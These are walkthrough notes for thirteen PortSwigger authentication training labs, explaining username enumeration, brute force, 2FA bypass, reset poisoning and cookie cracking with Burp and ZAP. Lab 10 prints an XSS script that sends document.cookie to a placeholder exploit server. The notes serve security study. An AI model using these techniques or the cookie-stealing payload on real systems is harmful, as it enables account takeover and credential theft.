## LAB - 1
**lab link: <https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses>**

 **Topic :-** 

- Username enumeration via different responses.

 **To Solve :-**

- Enumerate a valid username, brute-force this user's password, then access their account page.

 **Procedure :-**

1. Open the website in Owasp-Zap , and try test credentials
2. Enumerate the username wordlist in given wordlist using fuzzer. there will be a response packet with little larger size than others,  thats our username.
3. Then put the value of username and enumerate the given password wordlist in password using fuzzer.
4. Login with the obtained credentials


## LAB - 2
**lab link: <https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass>**

 **Topic :-** 

- 2FA simple bypass.

 **To Solve :-**

- Access Carlos's account page.

 **Procedure :-**

1. Open site in burp-suite, login with wiener's credentials and verify the code.
2. Then logout and turn on the intercept and login with carlos credentials, then the burpsuite capture that packet, then forword it untill reach "/login2" packet , drop it. and go to browser and replace the "login2" with "my-account" and forward it and Voila.


## LAB - 3
**lab link: <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic>**

 **Topic :-** 

- Password reset broken logic.

 **To Solve :-**

- Reset Carlos's password then log in and access his "My account" page.

 **Procedure :-**

1. Open site in Burp-suite. 
click reset password->enter username as "wiener" -> click on link in your email->enter new password , and submit.
2. Open the "POST forget-password?temp-forgot-password-token" request in repeater.
3. Change the "temp-forget-password-token" to some other value but should be same, and enter the username as carlos and submit.
4. Then login with username carlos and new password.


## LAB - 4
**lab link: <https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses>**

 **Topic :-** 

- Username enumeration via subtly different responses.

 **To Solve :-**

- Enumerate a valid username, brute-force this user's password, then access their account page.

 **Procedure :-**

1. Open the site in zap, try a test credentials in login.
2. Fuzz that page with given username word list in username input., if carefully see there is an input where there's "invalid username or password" instead of "invalid username or password."
3. Try that username along with fuzzing password using given password wordlist. then you get the username and password.


## LAB - 5
**lab link: <https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing>**

 **Topic :-** 

- Username enumeration via response timing.

 **To Solve :-**

- Enumerate a valid username, brute-force this user's password, then access their account page.


 **Procedure :-**

1. Open site in burp-suite, and try to login with test cred.
2. Open login page in repeater, compare the response time btw valid and invalid cred, it seems that first it checks the username, if username is true it does check the password, so if large password is sent it take much more time to verify. and also that the login page can not allow more than 3 tries. 
3. So add "X-Forward-For: " header and large password value and send the packet to intruder.
4. Fuzz through the "X-Forward-For: " value and username in a pitchfork way using username word list. the correct username would take slightly more time than others.
5. Then with username , brute force through the password with the given password wordlist. and when the cred are found.
6. Intercept the login page with correct cred. and add "X-Forwarded-For : " with random never used before value and forward all packet until the solved notification showed.


## LAB - 6
**lab link: <https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block>**

 **Topic :-**

- Broken brute-force protection, IP block.

 **To Solve :-**

- Brute-force the victim's password, then log in and access their account page.


 **Procedure :-**

1. Open site in burp suite, try login wrong cred more than 3 , it will show 1 min cooldown period. but if 3rd was right cred, then it count reset.
2. So with one right cred, we brute force the other acc. after every 2 carlos put one wiener in btw, and after every 2 brute force passwords , put one peter correct password for wiener, using a pitcher fork way of intruder. So send the login page to intruder and apply these condition and start attack, there will be only one 302 status code for carlos with its correct password.


## LAB - 7
**lab link: <https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock>**

 **Topic :-** 

- Username enumeration via account lock.

 **To Solve :-**

- Brute-force the victim's password, then log in and access their account page.


 **Procedure :-**

1. Open the site in Owasp-Zap , and tried a test cred to login. it can be seen that if valid username are used more than 4 consecutively, then it will throw error.
2. So we try a brute force on username using given username wordlist , keeping the packet size in mind.
3. The correct username would have the largest packet size .
4. Then we brute force the password using the username. as the error was nothing more than a warning . the packet containing the smallest size will contain the password.
5. Then login with correct credentials


## LAB - 8
**lab link: <https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic>**

 **Topic :-** 

- 2FA broken logic.

 **To Solve :-**

- Access Carlos's account page.


 **Procedure :-**

1. Open site in Owasp-Zap , login with wiener cred along with 2fa code.
2. In zap, there's a "login(2fa-code)" page can be seen. we can also see that cookie contain the verify "username" for the user and the session does not much matter.
3. So remove the session ide, replace verify from wiener to carlos and fuzz through the 2fa-code from 0000 to 9999. and you will get the 2fa code , you not need the password of carlos.
4. Open "login(2fa-code)" page, replace username from winer to carlos, change the 2fa-cosde to that found and there would also be session code which would be found while fuzzing the correct code, and put that session id to the new request and send . and Voila.


## LAB - 9
**lab link: <https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie>**

 **Topic :-**

- Brute-forcing a stay-logged-in cookie.

 **To Solve :-**

- Brute-force Carlos's cookie to gain access to his "My account" page.


 **Procedure :-**

1. Open site in burp and login with wiener cred with stayed log-in . in proxy-history, pages after the login contained the cookie containing "stayed-login" value which is base64("wiener:"+md5("peter")) . 
2. So we can brute force the password as carlos using same method as there is not use limit. using base64("carlos:"+(password)) , password from given word list.
3. Send any page containing "stayed-login" cookie to intruder remove session id, and brute force "stayed-login" value using password wordlist and in payload processor , first include md5 hasing, then "carlos:" prefix and then base64 encoding, and start attack . and voila. at some point the correct password would login and stayed login.


## LAB - 10
**lab link: <https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking>**

 **Topic :-** 

- Offline password cracking.

 **To Solve :-**

- Obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.

 **Procedure :-**

1. Login the wiener cred and post a script in comment to test XSS.
2. Then try 
```
<script>
	document.location='[explit_server_site/exploit]'+document.cookie
</script>
```
3. Post the comment and go to exploit server->access log. there you can see some one else's stayed-login cookie. decode its base64 , it would reveal that its of carlos and  decrypt the md5 hash next to carlos as it is its password.
4. Then login as carlos and delete the account.


## LAB - 11
**lab link: <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware>**

 **Topic :-** 

- Password reset poisoning via middleware.

 **To Solve :-**

- Log in to Carlos's account.

 **Procedure :-**

1. Open site in Burp-suite, in login page click forget password->enter username->go to email client->click the provided link->enter new password.
2. Open forget password page in repeater, add a "X-Forwarded-Host" header and put its value same as the exploit server and change username to carlos and send.
3. Open access log , you get the forget-password-token of carlos.
4. Open enter new password page in repeater, change the every forget-password token to the token u get earlier. and change password as u like.
5. Then login with carlos new credentials.


## LAB - 12
**lab link: <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change>**

 **Topic :-** 

- Password brute-force via password change.

 **To Solve :-**

- Use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.

 **Procedure :-**

1. Open site in zap, login with wiener credentials. try to change password with wrong password. the one will be logged out and a one minute calm down will be imposed.
2. After a  minute, again login with wiener credentials, this time again try to change password with wrong password but with different password in confirmation, it will not log u out , but states that password is wrong and if password is right and different password in confirmation then it states that password not match, so a brute force can be applied here.
3. Fuzz the change password request with username carlos and different new password , fuzzing the current password with the given password wordlist. and the one response with different and smallest size will be the one that caused by correct passwor.
4. Login with carlos credentials.


## LAB - 13
**lab link: <https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request>**

 **Topic :-** 

- Broken brute-force protection, multiple credentials per request.

 **To Solve :-**

- Brute-force Carlos's password, then access his account page.

 **Procedure :-**

1. Open the site in burp, login with random cred and intercept the request.
2. It can be seen that the username and password are in json format.
3. So make an array of all password of given password wordlist and put it in place of password and put carlos in username. and send.
4. Copy the session id in cookie and open a my-account page in repeater and put that session id in the page and done.

